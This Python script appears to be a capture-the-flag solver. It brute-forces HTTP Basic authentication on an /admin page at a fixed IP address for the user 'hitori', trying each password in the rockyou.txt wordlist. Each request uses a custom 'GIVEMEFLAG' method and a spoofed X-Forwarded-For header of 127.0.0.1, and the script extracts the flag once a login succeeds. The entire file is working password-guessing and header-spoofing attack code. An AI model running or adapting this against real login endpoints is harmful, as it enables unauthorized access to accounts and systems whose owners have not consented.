from base64 import b64encode
import time
import requests
from requests.exceptions import ReadTimeout, ConnectTimeout
from bs4 import BeautifulSoup

login_url = 'http://140.115.59.7:12002/admin'

login_headers = {
    "Host": "140.115.59.7:12002",
    "Cache-Control": "max-age=0",
    "Authorization": None,
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "https://www.adlSecurity.com",
    "X-Forwarded-For": "127.0.0.1",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9,zh-TW;q=0.8,zh;q=0.7,ja;q=0.6,zh-CN;q=0.5,yo;q=0.4",
    "Connection": "close"
}


def set_login(username, password):
    authorization = b64encode(f"{username}:{password}".encode('utf-8')).decode('ascii')
    login_headers["Authorization"] = f"Basic {authorization}"

count = 0
with open('rockyou.txt', 'r', encoding='latin-1') as rockyou:
    for line in rockyou:
        count += 1
        line = line.strip()
        print(f"try {count} password: {line}")
        set_login("hitori", line)
        while True:
            try:
                response = requests.request("GIVEMEFLAG", login_url, headers=login_headers, timeout=5)
                break
            except ReadTimeout:
                print("read timeout, retry")
            except ConnectTimeout:
                print("connect timeout, retry")
        if 'You have not been verified' not in response.text:
            print(f"found password!: {line}")
            soup = BeautifulSoup(response.text, 'html.parser')
            flag = soup.find('code').text
            print(f"flag: {flag}")
            break

